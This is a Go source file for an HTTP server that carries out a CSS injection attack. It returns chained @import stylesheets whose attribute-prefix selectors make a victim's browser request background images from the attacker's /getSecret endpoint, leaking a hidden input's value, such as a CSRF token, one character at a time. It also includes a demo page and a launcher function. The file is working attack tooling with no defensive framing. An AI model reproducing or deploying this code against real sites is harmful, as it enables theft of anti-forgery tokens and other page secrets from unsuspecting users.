package server

import (
	"fmt"
	"net/http"
	"strconv"
	"time"
)

var (
	tokenName  string
	tokenValue string
	listOfChar string
	verbose    bool
	tokenLen   int
	url        string
)

func hello(rw http.ResponseWriter, req *http.Request) {
	if verbose {
		fmt.Print("[Verbose] Request made to \"hello/\"\n")
	}

	var webpage string = `
	<html>
		<input name="csrf" value="456es4f5fgd5g6qdrg5qdrg5qdr2k5uylqzeze5gs564g" class="csrf">
		<style> @import url("/launchAttack?len=0"); </style>
	</html>
	`

	fmt.Fprint(rw, webpage)
}

func getSecret(rw http.ResponseWriter, req *http.Request) {
	if verbose {
		fmt.Print("[Verbose] Request made to \"getSecret/\"\n")
		fmt.Printf("[Verbose] Query = %s\n", req.URL.Query())
	}

	//Get char from query
	param := req.URL.Query().Get("char")

	//If it exists, add it to the current token
	if param != "" {
		tokenValue += param
		fmt.Printf("%s = %s\n", tokenName, tokenValue)
	}
}

func attack(rw http.ResponseWriter, req *http.Request) {

	if verbose {
		fmt.Print("[Verbose] Request made to \"attack/\"\n")
		fmt.Printf("[Verbose] Query = %s\n", req.URL.Query())
	}

	//Create CSS that will make a request which will exfiltrate a new char from the token
	var css string = ""
	for _, ch := range listOfChar {
		css += "input[name=" + tokenName + "][value^=\"" + tokenValue + string(ch) + "\"] "
		css += "{\n\tbackground-image: url(\"" + url + "/getSecret?char=" + string(ch) + "\");\n}\n\n"
	}
	//Send the response
	rw.Header().Set("Content-Type", "text/css")
	rw.WriteHeader(http.StatusOK)
	fmt.Fprint(rw, css)
}

func launchAttack(rw http.ResponseWriter, req *http.Request) {

	if verbose {
		fmt.Print("[Verbose] Request made to \"launchAttack/\"\n")
		fmt.Printf("[Verbose] Query = %s\n", req.URL.Query())
	}

	//Get char index from query
	index := req.URL.Query().Get("len")
	nb, _ := strconv.Atoi(index)

	if tokenLen > nb {
		var webpage string = ""

		//Wait a little bit
		for nb > len(tokenValue) {
			time.Sleep(100000)
		}

		//Create the CSS that will make two requests
		webpage += "@import url(\"" + url + "/attack?len=" + index + "\");\n"
		webpage += "@import url(\"" + url + "/launchAttack?len=" + strconv.Itoa(nb+1) + "\");\n"

		//Send the response
		rw.Header().Set("Content-Type", "text/css")
		rw.WriteHeader(http.StatusOK)
		fmt.Fprint(rw, webpage)

	}

}

func StartTool(port int, secret string, listChar string, v bool, ls int) {
	tokenName = secret
	tokenValue = ""
	listOfChar = listChar
	verbose = v
	tokenLen = ls
	url = "http://localhost:" + strconv.Itoa(port)

	launchServer(port)
}

func launchServer(port int) {

	fmt.Printf("Server launch on port %d\n", port)

	http.HandleFunc("/hello", hello)
	http.HandleFunc("/launchAttack", launchAttack)
	http.HandleFunc("/attack", attack)
	http.HandleFunc("/getSecret", getSecret)

	http.ListenAndServe(":"+strconv.Itoa(port), nil)

}
